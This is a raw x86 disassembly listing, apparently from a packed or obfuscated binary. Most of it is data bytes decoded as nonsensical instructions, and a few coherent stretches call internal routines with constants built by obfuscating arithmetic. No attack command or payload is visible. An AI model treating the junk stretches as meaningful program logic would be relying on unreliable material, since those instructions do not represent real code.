  40dce8:	cmp    ebp,edi
  40dcea:	dec    esi
  40dceb:	repnz xchg ebx,eax
  40dced:	jp     0x40dd3b
  40dcef:	mov    esp,0x5f380a4
  40dcf4:	push   edi
  40dcf5:	add    ch,al
  40dcf7:	xor    eax,ebx
  40dcf9:	mov    ecx,DWORD PTR [ebp+0x3d]
  40dcfc:	push   es
  40dcfd:	test   eax,0x7189053d
  40dd02:	mov    dl,0xdf
  40dd04:	push   es
  40dd05:	xlat   BYTE PTR ds:[ebx]
  40dd06:	xchg   edx,eax
  40dd07:	rol    edi,0xfc
  40dd0a:	retf   0x61d7
  40dd0d:	addr16 add edx,0xffffffe8
  40dd11:	jmp    DWORD PTR [ecx+ebx*1-0x3a434664]
  40dd18:	das    
  40dd19:	sahf   
  40dd1a:	push   ds
  40dd1b:	test   ebx,edi
  40dd1d:	out    0x7f,al
  40dd1f:	mov    ebx,0xfcf76df7
  40dd24:	mov    ebx,0xacf79672
  40dd29:	aaa    
  40dd2a:	aaa    
  40dd2b:	add    BYTE PTR [esi+ecx*2],0x31
  40dd2f:	push   ss
  40dd30:	push   edi
  40dd31:	sbb    esi,DWORD PTR [ebp-0x30]
  40dd34:	push   ds
  40dd35:	ss dec ecx
  40dd37:	sbb    dh,BYTE PTR [esp+esi*4+0x7403e5f8]
  40dd3e:	repz push ebx
  40dd40:	jle    0x40dcc9
  40dd42:	popa   
  40dd43:	jl     0x40dd6e
  40dd45:	mov    dh,BYTE PTR [esi+0x59aee9ec]
  40dd4b:	jmp    DWORD PTR [ebx+0x24]
  40dd4e:	adc    ebx,DWORD PTR [eax]
  40dd50:	dec    ecx
  40dd51:	sbb    al,0xd0
  40dd53:	mov    eax,ds:0xbc37ded2
  40dd58:	adc    ecx,edi
  40dd5a:	xor    BYTE PTR [edi],al
  40dd5c:	mov    ecx,0x29128039
  40dd61:	jne    0x40dda2
  40dd63:	out    dx,eax
  40dd64:	add    eax,0x9ddb5ab4
  40dd69:	arpl   WORD PTR [esi-0x16],ax
  40dd6c:	sbb    BYTE PTR [ebx],bl
  40dd6e:	or     bh,al
  40dd70:	retf   0xa717
  40dd73:	xchg   edx,eax
  40dd74:	sub    eax,0xe003b4c7
  40dd79:	jns    0x40ddd0
  40dd7b:	and    DWORD PTR [esi],eax
  40dd7d:	pop    es
  40dd7e:	xchg   BYTE PTR [esi+0x47],ch
  40dd81:	js     0x40dd6f
  40dd83:	lock mov ah,0xb4
  40dd87:	pop    ebp
  40dd88:	or     ebp,DWORD PTR [esi+0x5b75f909]
  40dd8e:	int    0xe2
  40dd90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dd91:	push   edx
  40dd92:	fild   DWORD PTR [ebx-0x1180fc9]
  40dd98:	push   edx
  40dd99:	mov    fs,WORD PTR [edi+0x28]
  40dd9c:	mov    ah,0x6e
  40dd9e:	xchg   ecx,eax
  40dd9f:	mov    eax,ds:0x5b94b2b7
  40dda4:	xor    ah,BYTE PTR [ecx+esi*8+0x42]
  40dda8:	fst    DWORD PTR [edi]
  40ddaa:	es pop ecx
  40ddac:	outs   dx,BYTE PTR ds:[esi]
  40ddad:	ss addr16 gs iret 
  40ddb1:	xlat   BYTE PTR ds:[ebx]
  40ddb2:	ins    BYTE PTR es:[edi],dx
  40ddb3:	out    0x55,al
  40ddb5:	push   eax
  40ddb6:	jecxz  0x40de26
  40ddb8:	dec    BYTE PTR [esi-0x61b7ad6c]
  40ddbe:	fwait
  40ddbf:	mov    al,BYTE PTR [ecx+0x7dac8938]
  40ddc5:	aaa    
  40ddc6:	xor    eax,0xd9a75128
  40ddcb:	and    al,0xd9
  40ddcd:	sar    DWORD PTR [edi],cl
  40ddcf:	popf   
  40ddd0:	(bad)  
  40ddd1:	jl     0x40dd7c
  40ddd3:	jns    0x40dd7f
  40ddd5:	dec    si
  40ddd7:	or     al,0x1c
  40ddd9:	in     eax,dx
  40ddda:	cmp    eax,0x96f97334
  40dddf:	mov    edi,0x64e67e32
  40dde4:	adc    eax,0x3a937377
  40dde9:	xchg   ecx,eax
  40ddea:	pusha  
  40ddeb:	es (bad) 
  40dded:	(bad)  
  40ddf0:	stos   DWORD PTR es:[edi],eax
  40ddf1:	jp     0x40de4c
  40ddf3:	aaa    
  40ddf4:	xor    ebx,DWORD PTR [edi-0x189bcf63]
  40ddfa:	dec    eax
  40ddfb:	dec    ebp
  40ddfc:	ss int3 
  40ddfe:	mov    dh,BYTE PTR [edx+0x61]
  40de01:	fstp   DWORD PTR [ebp-0x25553a13]
  40de07:	iret   
  40de08:	js     0x40ddfa
  40de0a:	dec    ebx
  40de0b:	sbb    eax,0xb65c985
  40de10:	in     al,0x55
  40de12:	xchg   DWORD PTR [esi+0x39],ebx
  40de15:	or     edi,esi
  40de17:	(bad)  
  40de18:	call   0xebf84829
  40de1d:	sar    dh,1
  40de1f:	mov    ebp,0xf4e6c46f
  40de24:	add    DWORD PTR [ebp+0x54],esp
  40de27:	and    al,0xce
  40de29:	cmp    ebx,esi
  40de2b:	(bad)  [edi]
  40de2d:	jecxz  0x40de3e
  40de2f:	mov    ecx,0x9c31ae9a
  40de34:	(bad)  
  40de35:	adc    DWORD PTR [edi-0x15],edx
  40de38:	push   ds
  40de39:	out    0x3b,al
  40de3b:	js     0x40de2c
  40de3d:	jmp    0x54d1c9fb
  40de42:	add    eax,0xa085d6ed
  40de47:	stos   DWORD PTR es:[edi],eax
  40de48:	push   ebp
  40de49:	and    ecx,DWORD PTR [ebx+0x755fc9bd]
  40de4f:	pushf  
  40de50:	sbb    DWORD PTR [ebx-0x76],eax
  40de53:	pop    esp
  40de54:	mov    ch,0x5b
  40de56:	inc    esi
  40de57:	addr16 jp 0x40de6d
  40de5a:	lds    edi,FWORD PTR [ebx+edi*1]
  40de5d:	(bad)  
  40de5e:	mov    WORD PTR [esi-0x6d],fs
  40de61:	pop    edx
  40de62:	outs   dx,DWORD PTR ds:[esi]
  40de63:	xchg   dx,ax
  40de65:	sub    dh,dh
  40de67:	sbb    BYTE PTR [eax-0x76],cl
  40de6a:	push   ebp
  40de6b:	pop    esp
  40de6c:	ficomp DWORD PTR [ecx-0x32eb6b59]
  40de72:	retf   
  40de73:	pusha  
  40de74:	iret   
  40de75:	jns    0x40dee0
  40de77:	es mov cl,0x63
  40de7a:	and    eax,0x9448758a
  40de7f:	xor    edx,DWORD PTR [ebp+0x77]
  40de82:	mov    ebp,0x547124d7
  40de87:	jp     0x40de76
  40de89:	inc    ebp
  40de8a:	push   eax
  40de8b:	mov    dl,al
  40de8d:	mov    edi,0xdb882f4d
  40de92:	shr    dl,0x7c
  40de95:	les    ebp,FWORD PTR [ecx-0x4f9ae928]
  40de9b:	mov    esi,0x5a4f990c
  40dea0:	ret    
  40dea1:	dec    ebp
  40dea2:	mov    WORD PTR [edi+edx*1+0x514571de],ss
  40dea9:	xor    edi,eax
  40deab:	inc    ebp
  40deac:	call   0x4130fe
  40deb1:	mov    DWORD PTR [ebp-0x14],0x1600
  40deb8:	mov    eax,DWORD PTR [ebp-0x18]
  40debb:	mov    ecx,DWORD PTR [ebp-0x14]
  40debe:	mov    edx,DWORD PTR [ebp-0x10]
  40dec1:	mov    edi,DWORD PTR [ebp-0xc]
  40dec4:	push   edi
  40dec5:	push   edx
  40dec6:	push   ecx
  40dec7:	push   eax
  40dec8:	call   0x41594e
  40decd:	mov    ecx,DWORD PTR [ebp-0x8]
  40ded0:	mov    edi,DWORD PTR [ebp-0x4]
  40ded3:	add    eax,0x1dc8
  40ded8:	adc    edx,0x6fbf
  40dede:	and    edx,edi
  40dee0:	push   0x1061
  40dee5:	and    eax,ecx
  40dee7:	or     edx,0x23ff
  40deed:	push   0x4000022f
  40def2:	or     eax,0x58c4
  40def7:	xor    edx,0x7a7a
  40defd:	xor    eax,0x5278
  40df02:	push   edx
  40df03:	push   eax
  40df04:	call   0x422281
  40df09:	jmp    0x40e198
  40df0e:	and    eax,0x8c7544dd
  40df13:	jnp    0x40df51
  40df15:	scas   al,BYTE PTR es:[edi]
  40df16:	fs aam 0x9e
  40df19:	nop
  40df1a:	(bad)  
  40df1b:	xchg   ebx,eax
  40df1c:	and    al,0x9e
  40df1e:	push   ss
  40df1f:	cld    
  40df20:	mov    esi,0xbec299be
  40df25:	mov    esi,0x8b5421d0
  40df2a:	jmp    0xa0576f74
  40df2f:	or     edx,esp
  40df31:	jp     0x40df40
  40df33:	loope  0x40df83
  40df35:	repnz xchg ebp,eax
  40df37:	mov    bh,BYTE PTR [ebp+0xd]
  40df3a:	xor    al,cl
  40df3c:	mov    ah,ah
  40df3e:	(bad)  
  40df3f:	jg     0x40df3c
  40df41:	lock lock push ebp
  40df44:	sub    BYTE PTR [esi-0x1280a31c],bh
  40df4a:	xor    dl,bh
  40df4c:	and    eax,ecx
  40df4e:	and    al,0xa0
  40df50:	icebp  
  40df51:	adc    dh,BYTE PTR [eax+edx*4]
  40df54:	test   al,0x30
  40df56:	add    DWORD PTR [edi+0x1ec8f3b4],esi
  40df5c:	shl    edi,0x1a
  40df5f:	push   es
  40df60:	retf   
  40df61:	outs   dx,BYTE PTR ds:[esi]
  40df62:	cmp    BYTE PTR [edi],0xe7
  40df65:	cmp    DWORD PTR [eax-0x4692acc7],ebp
  40df6b:	xlat   BYTE PTR ds:[ebx]
  40df6c:	xor    cl,BYTE PTR [edx-0x64]
  40df6f:	inc    ecx
  40df71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40df72:	retf   
  40df73:	das    
  40df74:	imul   edi,DWORD PTR [edi-0x24cb415a],0xee35e2d4
  40df7e:	in     al,0xac
  40df80:	adc    esi,DWORD PTR [ebp+0x6f]
  40df83:	mov    esi,0xde685329
  40df88:	mov    bh,BYTE PTR [edi]
  40df8a:	jbe    0x40dffb
  40df8c:	clc    
  40df8d:	lods   al,BYTE PTR ds:[esi]
  40df8e:	inc    ebx
  40df8f:	jno    0x40df8e
  40df91:	call   0x8171bbf5
  40df96:	dec    ecx
  40df97:	jle    0x40df1f
  40df99:	iret   
  40df9a:	push   edi
  40df9b:	scas   al,BYTE PTR es:[edi]
  40df9c:	add    esp,DWORD PTR [ebx+0x4ffd5663]
  40dfa2:	mov    bl,0x4
  40dfa4:	adc    DWORD PTR [edi-0x58],ebp
  40dfa7:	(bad)  
  40dfa8:	fstp   QWORD PTR [ebx]
  40dfaa:	or     edi,DWORD PTR [ebp+0x2c]
  40dfad:	pop    edx
  40dfae:	mov    al,0x68
  40dfb0:	jp     0x40dfd1
  40dfb2:	aam    0x45
  40dfb4:	call   0x27dd:0xddaaa2ef
  40dfbb:	jmp    0x40e014
  40dfbd:	data16 fcomp DWORD PTR [edi+0x70]
  40dfc1:	repnz sub ebx,DWORD PTR [eax+ecx*4-0x5e2482e2]
  40dfc9:	ror    edx,0x17
  40dfcc:	push   0xc
  40dfce:	jmp    0x40df99
  40dfd0:	xor    al,0x78
  40dfd2:	aam    0x1b
  40dfd4:	or     dl,cl
  40dfd6:	cdq    
  40dfd7:	jmp    0x224e9a6e
  40dfdc:	or     ebp,ebp
  40dfde:	mov    DWORD PTR ds:0xb2c45403,esp
  40dfe4:	push   ds
  40dfe5:	in     al,0xc8
  40dfe7:	lods   al,BYTE PTR ds:[esi]
  40dfe8:	outs   dx,BYTE PTR ds:[esi]
  40dfe9:	push   esi
  40dfea:	adc    DWORD PTR [esp+edx*4-0x1cb42de0],ebx
  40dff1:	xchg   ebp,eax
  40dff2:	add    esi,DWORD PTR [edx-0x5eaf45f1]
  40dff8:	lods   al,BYTE PTR ds:[esi]
  40dff9:	xchg   esi,eax
  40dffa:	add    BYTE PTR [edi+0x11100e37],cl
  40e000:	fsub   st,st(6)
  40e002:	retf   
  40e003:	and    al,cl
  40e005:	lods   al,BYTE PTR ds:[esi]
  40e006:	adc    eax,0xdef88572
  40e00b:	(bad)  
  40e00c:	adc    dh,dl
  40e00e:	xchg   DWORD PTR [esi+0x4d],ebp
  40e011:	rol    BYTE PTR ds:0x884dbea9,0x46
  40e018:	imul   eax,DWORD PTR [ebx+0x19],0x5c
  40e01c:	aad    0xbd
  40e01e:	iret   
  40e01f:	inc    esi
  40e020:	test   BYTE PTR [edi+0x17],al
  40e023:	inc    ebx
  40e024:	ror    BYTE PTR [eax+eax*1-0x5b],0x93
  40e029:	and    eax,DWORD PTR [eiz*1-0x2dfc3f8a]
  40e030:	jle    0x40e02b
  40e032:	jg     0x40e0b3
  40e034:	(bad)  
  40e036:	add    dh,BYTE PTR [esi]
  40e038:	call   0x262f:0xdebfd88
  40e03f:	lahf   
  40e040:	int    0xfb
  40e042:	cs aas 
  40e044:	sbb    bh,bh
  40e046:	clc    
  40e047:	sub    al,0x60
  40e049:	js     0x40e089
  40e04b:	cli    
  40e04c:	loope  0x40e035
  40e04e:	test   al,0x6
  40e050:	shl    BYTE PTR [ebp+0x6168df50],cl
  40e056:	out    dx,eax
  40e057:	sub    al,0x3e
  40e059:	sub    edi,DWORD PTR [ecx]
  40e05b:	jne    0x40e0d2
  40e05d:	icebp  
  40e05e:	adc    BYTE PTR [edx+0x1e],dh
  40e061:	or     eax,0xf92545c7
  40e066:	(bad)  
  40e067:	cmp    al,0xde
  40e069:	mov    al,ds:0x88de2419
  40e06e:	fldenv [esi]
  40e070:	push   0xffffffe7
  40e072:	pop    ss
  40e073:	push   ebp
  40e074:	leave  
  40e075:	pop    ebp
  40e076:	inc    esi
  40e077:	cwde   
  40e078:	aad    0x60
  40e07a:	mov    ?,eax
  40e07c:	imul   edi,DWORD PTR [esi+0x15],0x9f050b44
  40e083:	mov    es,WORD PTR [eax]
  40e085:	or     dl,BYTE PTR [edx+ebx*8+0x2241a988]
  40e08c:	or     al,0x4
  40e08e:	and    eax,0xddbccfff
  40e093:	(bad)  
  40e094:	lock jae 0x40e099
  40e097:	xor    BYTE PTR [ebp+0x79],ah
  40e09a:	outs   dx,DWORD PTR ds:[esi]
  40e09b:	lds    edx,FWORD PTR [edx+eiz*4]
  40e09e:	inc    ebx
  40e09f:	and    ebp,esp
  40e0a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e0a2:	mov    eax,ds:0x4da66cd4
  40e0a7:	jg     0x40e09e
  40e0a9:	jg     0x40e0cd
  40e0ab:	mov    bh,0xa8
  40e0ad:	je     0x40e124
  40e0af:	shl    DWORD PTR [edi],cl
  40e0b1:	ror    DWORD PTR [esi+eax*4-0x6d],0xa8
  40e0b6:	shl    DWORD PTR [ecx],cl
  40e0b8:	mov    edi,0x2969ed45
  40e0bd:	xor    BYTE PTR [esp+eax*4-0x7d22583],0x49
  40e0c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e0c6:	pop    ebp
  40e0c7:	cwde   
  40e0c8:	mov    edx,DWORD PTR [edx-0x56e0f558]
  40e0ce:	aam    0x39
  40e0d0:	jns    0x40e113
  40e0d2:	xor    al,0x4
  40e0d4:	or     BYTE PTR [esi+esi*8-0xe],dh
  40e0d8:	dec    ebp
  40e0d9:	mov    edi,0xd7af6e6b
  40e0de:	cs sti 
  40e0e0:	scas   eax,DWORD PTR es:[edi]
  40e0e1:	push   edi
  40e0e2:	or     eax,0x23f2ff4f
  40e0e7:	or     dl,BYTE PTR [edx]
  40e0e9:	out    0xe8,eax
  40e0eb:	push   edx
  40e0ec:	xchg   esp,eax
  40e0ed:	cmp    al,0x3a
  40e0ef:	nop
  40e0f0:	sbb    eax,0x89073482
  40e0f5:	jns    0x40e0b7
  40e0f7:	mov    ds:0x73ffbd8b,eax
  40e0fc:	jno    0x40e173
  40e0fe:	jo     0x40e108
  40e100:	jns    0x40e082
  40e102:	test   BYTE PTR [ecx-0x42035fd9],ch
  40e108:	inc    ebp
  40e109:	jne    0x40e174
  40e10b:	scas   eax,DWORD PTR es:[edi]
  40e10c:	push   es
  40e10d:	xor    al,0xa3
  40e10f:	lods   al,BYTE PTR ds:[esi]
  40e110:	push   edx
  40e111:	lock sbb BYTE PTR ds:0x5ee2637b,ah
  40e118:	sbb    BYTE PTR [edx-0x1e3bb748],cl
  40e11e:	retf   
  40e11f:	sar    DWORD PTR es:[esi+0x401ad609],0x67
  40e127:	and    al,0xd6
  40e129:	std    
  40e12a:	mov    dl,0x60
  40e12c:	jle    0x40e142
  40e12e:	ins    BYTE PTR es:[edi],dx
  40e12f:	bnd jnp 0x40e1aa
  40e132:	ss (bad) 
  40e134:	mov    al,0xcf
  40e136:	pop    ebp
  40e137:	sahf   
  40e138:	jno    0x40e180
  40e13a:	push   esi
  40e13b:	pop    ecx
  40e13c:	addr16 pop edi
  40e13e:	adc    al,0xad
  40e140:	push   0x23
  40e142:	fdivr  DWORD PTR es:[esi]
  40e145:	(bad)
  40e149:	call   0x3cdb:0x2078d2eb
  40e150:	sti    
  40e151:	jns    0x40e11f
  40e153:	jbe    0x40e1aa
  40e155:	and    edi,DWORD PTR [edx-0x7266706c]
  40e15b:	jmp    0x8b605a7c
  40e160:	mov    ds:0x93ebd0bc,al
  40e165:	(bad)  
  40e166:	repz dec esp
  40e168:	sbb    ebx,ebx
  40e16a:	fbld   TBYTE PTR ds:0x9dbba579
  40e170:	stc    
  40e171:	hlt    
  40e172:	push   0xca206e9b
  40e177:	push   cx
  40e179:	retf   0xf18
  40e17c:	pop    edx
  40e17d:	jo     0x40e1b8
  40e17f:	inc    edx
  40e180:	stos   DWORD PTR es:[edi],eax
  40e181:	lds    ecx,FWORD PTR [edx-0x59b37010]
  40e187:	sbb    eax,0x4b4d2388
  40e18c:	mov    esp,DWORD PTR [eax+edi*1]
  40e18f:	leave  
  40e190:	hlt    
  40e191:	jle    0x40e1ed
  40e193:	fsub   DWORD PTR [ebp+0x4c]
  40e196:	pop    ss
  40e197:	xchg   DWORD PTR [ecx-0x1fba38fa],ecx
  40e19d:	push   esp
  40e19e:	xor    eax,DWORD PTR [eax]
  40e1a0:	add    bh,al
  40e1a2:	inc    ebp
  40e1a3:	in     al,0x8c
  40e1a5:	jge    0x40e1a7
  40e1a7:	add    bh,al
  40e1a9:	inc    ebp
  40e1aa:	call   0x411ee5
  40e1af:	mov    DWORD PTR [ebp-0x14],0x51ef
  40e1b6:	xor    edi,edi
  40e1b8:	mov    DWORD PTR [ebp-0xc],0x3358
  40e1bf:	push   0xc9f
  40e1c4:	jmp    0x40e453
  40e1c9:	jecxz  0x40e232
  40e1cb:	fscale 
  40e1cd:	pop    edx
  40e1ce:	mov    ah,0x3c
  40e1d0:	lods   al,BYTE PTR ds:[esi]
  40e1d1:	je     0x40e1fd
  40e1d3:	push   eax
  40e1d4:	sahf   
  40e1d5:	push   edi
  40e1d6:	mov    edx,0x2f1a4fc
  40e1db:	mov    esi,0xbec299be
  40e1e0:	mov    esi,0x93af89f0
  40e1e5:	mov    DWORD PTR [esi+0x115e5982],ebx
  40e1eb:	ret    
  40e1ec:	mov    bl,dh
  40e1ee:	mov    al,0x83
  40e1f0:	bound  ebx,QWORD PTR [ebx]
  40e1f2:	mov    dh,BYTE PTR [ebp-0xac63333]
  40e1f8:	dec    edi
  40e1f9:	data16 cld 
  40e1fb:	fwait
  40e1fc:	push   cx
  40e1fe:	xor    eax,0x3a65ea6c
  40e203:	xor    esp,edx
  40e205:	xchg   ebx,eax
  40e206:	leave  
  40e207:	imul   ebx,DWORD PTR [ecx+ebp*1-0x5583b626],0x9560f963
  40e212:	push   DWORD PTR [edx+0x4d89fbd8]
  40e218:	push   ebp
  40e219:	lds    edx,FWORD PTR ds:0xeb4a3ff2
  40e21f:	das    
  40e220:	aaa    
  40e221:	daa    
  40e222:	sahf   
  40e223:	jl     0x40e2a3
  40e225:	mov    eax,ds:0xdc96bcd7
  40e22a:	out    dx,eax
  40e22b:	mov    edi,0xcd8b259d
  40e230:	jp     0x40e249
  40e232:	pop    es
  40e233:	jmp    0x6b24:0xc5efd298
  40e23a:	pusha  
  40e23b:	add    ch,bh
  40e23d:	lods   al,BYTE PTR ds:[esi]
  40e23e:	loop   0x40e258
  40e240:	sub    bh,bh
  40e242:	retf   0xe31e
  40e245:	mov    ah,0x87
  40e247:	scas   eax,DWORD PTR es:[edi]
  40e248:	cmp    eax,0x6cc2969
  40e24d:	pop    ebx
  40e24e:	jo     0x40e264
  40e250:	cs test eax,0x8951ec2f
  40e256:	or     al,0x2c
  40e258:	dec    ebx
  40e259:	mov    eax,ds:0xe12c8067
  40e25e:	cli    
  40e25f:	out    0x7d,eax
  40e261:	jmp    0xe454:0x5e39e12b
  40e268:	mov    al,ds:0xf23e3139
  40e26d:	or     eax,0x807334e7
  40e272:	and    ebx,DWORD PTR [edi]
  40e274:	iret   
  40e275:	dec    edx
  40e276:	bound  edi,QWORD PTR [ecx-0x4e9b3591]
  40e27c:	and    al,0xbb
  40e27e:	jno    0x40e27c
  40e280:	mov    esi,0xfabb9b79
  40e285:	dec    esi
  40e286:	mov    cl,0xeb
  40e288:	sub    BYTE PTR [eax-0x3c],dh
  40e28b:	shl    BYTE PTR [edx-0x6d],0xdb
  40e28f:	ins    DWORD PTR es:[edi],dx
  40e290:	sbb    esi,DWORD PTR [eax]
  40e292:	daa    
  40e293:	mov    al,0x62
  40e295:	dec    edi
  40e296:	pop    ebp
  40e297:	jg     0x40e232
  40e299:	adc    al,0x8b
  40e29b:	jne    0x40e307
  40e29d:	add    cl,BYTE PTR [ebx-0x12f176b2]
  40e2a3:	ficom  WORD PTR [ecx]
  40e2a5:	out    0xd5,al
  40e2a7:	aam    0x4e
  40e2a9:	xor    esi,ecx
  40e2ab:	pusha  
  40e2ac:	add    DWORD PTR [ecx],0x28
  40e2af:	setl   BYTE PTR [esi]
  40e2b2:	xor    BYTE PTR cs:[eax],0x18
  40e2b6:	icebp  
  40e2b7:	sbb    dh,BYTE PTR [edi]
  40e2b9:	pop    ecx
  40e2ba:	aad    0xa5
  40e2bc:	aad    0xf7
  40e2be:	sti    
  40e2bf:	loopne 0x40e331
  40e2c1:	in     al,0x77
  40e2c3:	cmc    
  40e2c4:	cmp    BYTE PTR [ecx-0x7f90ff8a],bl
  40e2ca:	mov    DWORD PTR ds:0x22f01bff,0xcfc0ac62
  40e2d4:	mov    ebp,0x69093afa
  40e2d9:	inc    ecx
  40e2da:	pop    ecx
  40e2db:	push   esi
  40e2dc:	mov    al,0xa0
  40e2de:	ret    
  40e2df:	lahf   
  40e2e0:	ins    DWORD PTR es:[edi],dx
  40e2e1:	popa   
  40e2e2:	pop    ecx
  40e2e3:	mov    edx,0x8259e9a5
  40e2e8:	pusha  
  40e2e9:	std    
  40e2ea:	jno    0x40e314
  40e2ec:	shl    edx,1
  40e2ee:	sbb    eax,0x3ef5c9c9
  40e2f3:	fnstsw WORD PTR [edi+0x7b]
  40e2f6:	loope  0x40e2ef
  40e2f8:	mov    ebx,0xfbc6f57a
  40e2fd:	mov    eax,DWORD PTR [ebx-0x239e2273]
  40e303:	out    0x57,al
  40e305:	daa    
  40e306:	add    DWORD PTR [ecx+ecx*4-0x2362106f],0x7e
  40e30e:	fnsave [ecx-0x38485bbb]
  40e314:	xor    esp,ebp
  40e316:	inc    edi
  40e317:	int    0x24
  40e319:	stc    
  40e31a:	or     BYTE PTR [ecx+eax*2-0x37a66e2f],al
  40e321:	mov    ah,0x85
  40e323:	retfw  0xc4a6
  40e327:	aad    0x4a
  40e329:	cwde   
  40e32a:	inc    edi
  40e32b:	frstor [eax+ecx*8+0x6f]
  40e32f:	xchg   ecx,eax
  40e330:	fs push ss
  40e332:	add    eax,0x24aa3c3a
  40e337:	test   al,0x2e
  40e339:	lods   eax,DWORD PTR ds:[esi]
  40e33a:	adc    al,0x66
  40e33c:	mov    edi,0x2335cf9a
  40e341:	dec    eax
  40e342:	mov    eax,0xdd8f91f1
  40e347:	cmp    DWORD PTR [edx-0x179576dc],ebx
  40e34d:	push   ss
  40e34e:	lea    eax,[ebx-0x75a4977d]
  40e354:	loopne 0x40e3d0
  40e356:	hlt    
  40e357:	nop
  40e358:	ins    DWORD PTR es:[edi],dx
  40e359:	mov    bh,0xb4
  40e35b:	shr    ebx,cl
  40e35d:	mov    al,0x60
  40e35f:	pop    ss
  40e360:	mov    al,BYTE PTR [eax]
  40e362:	cmp    al,0xf4
  40e364:	xchg   BYTE PTR [ecx+0x65],dh
  40e367:	lock test al,0x3d
  40e36a:	xchg   edi,eax
  40e36b:	fdivr  DWORD PTR [edx+esi*8]
  40e36e:	sar    DWORD PTR [eax-0x13],1
  40e371:	(bad)  
  40e372:	aad    0x82
  40e374:	icebp  
  40e375:	ror    ah,1
  40e377:	add    BYTE PTR [ebp-0x4],dl
  40e37a:	stos   BYTE PTR es:[di],al
  40e37c:	sub    al,BYTE PTR [esi]
  40e37e:	mov    dh,0xf9
  40e380:	aaa    
  40e381:	ja     0x40e3bb
  40e383:	sub    al,0x73
  40e385:	iret   
  40e386:	and    BYTE PTR [edi],bh
  40e388:	into   
  40e389:	cs mov esi,0x2180f7df
  40e38f:	adc    dl,bh
  40e391:	leave  
  40e392:	jb     0x40e34a
  40e394:	(bad)  
  40e395:	in     al,0x79
  40e397:	sbb    al,0x5f
  40e399:	mov    WORD PTR [esi],fs
  40e39b:	jle    0x40e41a
  40e39d:	sti    
  40e39e:	sar    DWORD PTR [ebp-0x23],0x1
  40e3a2:	push   cs
  40e3a3:	jnp    0x40e41e
  40e3a5:	js     0x40e3b2
  40e3a7:	and    bh,ch
  40e3a9:	mov    ecx,0x86b2cd77
  40e3ae:	jne    0x40e384
  40e3b0:	mov    ebx,0x9fee76a3
  40e3b5:	adc    al,0x53
  40e3b7:	call   0x16ec54ac
  40e3bc:	or     edi,DWORD PTR [ecx-0x67266248]
  40e3c2:	gs and esi,esi
  40e3c5:	stos   BYTE PTR es:[edi],al
  40e3c6:	mov    ds:0xc9f24460,eax
  40e3cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e3cc:	adc    edi,DWORD PTR [ecx-0x66d8ad44]
  40e3d2:	out    0x73,al
  40e3d4:	test   DWORD PTR [eax+eax*2],eax
  40e3d7:	cs js  0x40e3dd
  40e3da:	pop    ds
  40e3db:	retf   0x88ed
  40e3de:	ret    0xb322
  40e3e1:	jne    0x40e456
  40e3e3:	repz sub cl,BYTE PTR [eax-0x26]
  40e3e7:	adc    BYTE PTR [esi],0xb9
  40e3ea:	xchg   BYTE PTR [edi-0x16],bh
  40e3ed:	in     eax,0x3b
  40e3ef:	xchg   esi,eax
  40e3f0:	or     BYTE PTR [ecx-0x19e3dc06],al
  40e3f6:	jecxz  0x40e456
  40e3f8:	cmp    BYTE PTR [ebx-0x4d],al
  40e3fb:	xchg   DWORD PTR [ebx+edx*4],eax
  40e3fe:	cmp    BYTE PTR [esi+0x5473ef9b],bl
  40e404:	mov    edx,0x8ef239e4
  40e409:	or     BYTE PTR [ebx],al
  40e40b:	jnp    0x40e3e4
  40e40d:	lock dec di
  40e410:	pushf  
  40e411:	adc    ch,BYTE PTR [edx+0x43]
  40e414:	pop    ebp
  40e415:	sbb    eax,0x64faf75
  40e41a:	xchg   esi,eax
  40e41b:	ror    BYTE PTR [edi-0x7],cl
  40e41e:	aam    0xca
  40e420:	(bad)  
  40e421:	loope  0x40e3b8
  40e423:	jae    0x40e40b
  40e425:	ror    BYTE PTR [eax+0x11d1b2a9],1
  40e42b:	int3   
  40e42c:	aad    0xe
  40e42e:	xor    ebp,ecx
  40e430:	jl     0x40e485
  40e432:	daa    
  40e433:	and    eax,0x934827c2
  40e438:	adc    DWORD PTR [ebx],edx
  40e43a:	jge    0x40e475
  40e43c:	int3   
  40e43d:	jmp    0x3a10:0xa4de1e8d
  40e444:	push   edi
  40e445:	call   0xa83186a1
  40e44a:	lds    ebp,FWORD PTR [edi+0x6b62cf7f]
  40e450:	stos   DWORD PTR es:[edi],eax
  40e451:	stos   BYTE PTR es:[edi],al
  40e452:	cli    
  40e453:	inc    edi
  40e454:	mov    DWORD PTR [ebp-0x4],edi
  40e457:	mov    eax,DWORD PTR [ebp-0x18]
  40e45a:	mov    ecx,DWORD PTR [ebp-0x14]
  40e45d:	push   0x1c19
  40e462:	push   ecx
  40e463:	push   eax
  40e464:	call   0x41594e
  40e469:	mov    ecx,DWORD PTR [ebp-0x20]
  40e46c:	mov    ebx,DWORD PTR [ebp-0x1c]
  40e46f:	or     eax,ecx
  40e471:	or     edx,ebx
  40e473:	push   0x20fa
  40e478:	add    eax,0x7fac
  40e47d:	push   0x1cd48ab
  40e482:	adc    edx,0x133b
  40e488:	push   edx
  40e489:	push   eax
  40e48a:	call   0x422281
  40e48f:	mov    ebx,DWORD PTR [ebp-0x4]
  40e492:	lea    ecx,[eax-0x5d40]
  40e498:	xor    edx,edx
  40e49a:	mov    eax,0x16c2
  40e49f:	div    ebx
  40e4a1:	mov    edx,DWORD PTR [ebp-0xc]
  40e4a4:	sub    eax,edx
  40e4a6:	mov    DWORD PTR [esi+eax*4+0x725c],ecx
  40e4ad:	mov    DWORD PTR [ebp-0x14],0x6af0
  40e4b4:	mov    DWORD PTR [ebp-0x4],edi
  40e4b7:	mov    DWORD PTR [ebp-0xc],0x2c8a
  40e4be:	mov    ecx,DWORD PTR [ebp-0xc]
  40e4c1:	mov    eax,0x4401
  40e4c6:	sub    eax,ecx
  40e4c8:	mov    ecx,DWORD PTR [ebp-0x4]
  40e4cb:	xor    edx,edx
  40e4cd:	div    ecx
  40e4cf:	mov    ecx,DWORD PTR [ebp-0x14]
  40e4d2:	xor    eax,0xa80
  40e4d7:	or     eax,0x343b
  40e4dc:	or     eax,ecx
  40e4de:	mov    ecx,DWORD PTR [ebp+0x8]
  40e4e1:	mov    DWORD PTR [esi+eax*4-0x1fff4],ecx
  40e4e8:	mov    DWORD PTR [ebp-0xc],0x327f
